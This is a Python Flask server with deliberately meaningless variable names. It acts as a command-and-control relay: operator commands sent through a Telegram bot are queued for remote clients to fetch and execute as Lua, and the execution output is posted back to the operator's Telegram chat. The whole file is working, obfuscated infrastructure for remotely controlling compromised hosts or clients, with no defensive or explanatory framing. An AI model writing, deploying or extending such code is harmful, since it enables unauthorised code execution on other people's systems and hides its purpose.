from flask import Flask, request, jsonify
import threading, time, requests, os, io

_k1 = os.environ.get("API_KEY", "")
_k2 = int(os.environ.get("NODE_ID", "0"))
_k3 = os.environ.get("AUTH_SIG", "")

if not _k1 or not _k2 or not _k3:
    raise SystemExit("config missing")

_a1 = Flask(__name__)
_a2 = []
_a3 = []
_a4 = threading.Lock()

@_a1.route("/health")
def _h0():
    return "ok"

@_a1.route("/")
def _h1():
    return "alive"

@_a1.route("/poll")
def _h2():
    if request.args.get("token") != _k3:
        return jsonify({"error": "no"}), 403
    with _a4:
        _o = _a2[:]
        _a2.clear()
    return jsonify(_o)

@_a1.route("/result", methods=["POST"])
def _h3():
    if request.headers.get("X-Token") != _k3:
        return jsonify({"error": "no"}), 403
    _d = request.json or {}
    with _a4:
        _a3.append({
            "cmd": _d.get("cmd"),
            "out": _d.get("out", "")[:100000]
        })
    return jsonify({"ok": True})

def _s1(_t):
    try:
        requests.post(
            "https://api.telegram.org/bot" + _k1 + "/sendMessage",
            data={"chat_id": _k2, "text": _t[:4000]},
            timeout=10
        )
    except Exception as _e:
        print("err:", _e)

def _s2(_n, _c):
    try:
        requests.post(
            "https://api.telegram.org/bot" + _k1 + "/sendDocument",
            data={"chat_id": _k2, "caption": _n},
            files={"document": (_n, io.BytesIO(_c.encode("utf-8")), "text/plain")},
            timeout=30
        )
    except Exception as _e:
        print("err:", _e)

def _p1():
    _l = None
    while True:
        try:
            _r = requests.get(
                "https://api.telegram.org/bot" + _k1 + "/getUpdates",
                params={"timeout": 25, "offset": _l + 1 if _l else -1},
                timeout=35
            ).json()
            if not _r.get("ok"):
                time.sleep(3); continue
            for _u in _r.get("result", []):
                _l = _u.get("update_id")
                _m = _u.get("message") or {}
                _c = (_m.get("chat") or {}).get("id")
                _x = (_m.get("text") or "").strip()
                if _c != _k2 or not _x: continue
                if _x == "/start":
                    _s1("SS Ready."); continue
                if _x == "/help":
                    _s1("exec <lua>\n/status\n/last"); continue
                if _x == "/status":
                    with _a4: _s1("q " + str(len(_a2)) + " r " + str(len(_a3)))
                    continue
                if _x == "/last":
                    with _a4: _z = _a3[-10:]
                    if not _z:
                        _s1("empty"); continue
                    _txt = "\n\n".join("$ " + str(x["cmd"]) + "\n" + str(x["out"]) for x in _z)
                    _s2("last.txt", _txt)
                    continue
                _y = _x[5:] if _x.startswith("exec ") else _x
                with _a4: _a2.append({"cmd": _y, "ts": time.time()})
        except Exception as _e:
            print("err:", _e); time.sleep(3)

def _p2():
    while True:
        time.sleep(2)
        with _a4:
            if not _a3: continue
            _b = _a3[:]; _a3.clear()
        for _x in _b:
            _c = _x.get("cmd") or ""
            _o = (_x.get("out") or "").strip()
            if _o.startswith("compile err:") or _o.startswith("runtime err:"):
                _s1("Error: " + _o)
            else:
                if not _o or _o == "nil":
                    _s1("Successfully!")
                else:
                    _s2("result.txt", "$ " + _c + "\n\n" + _o)

threading.Thread(target=_p1, daemon=True).start()
threading.Thread(target=_p2, daemon=True).start()

if __name__ == "__main__":
    _prt = int(os.environ.get("PORT", 8080))
    print("[+] started", _prt)
    _a1.run(host="0.0.0.0", port=_prt, debug=False)
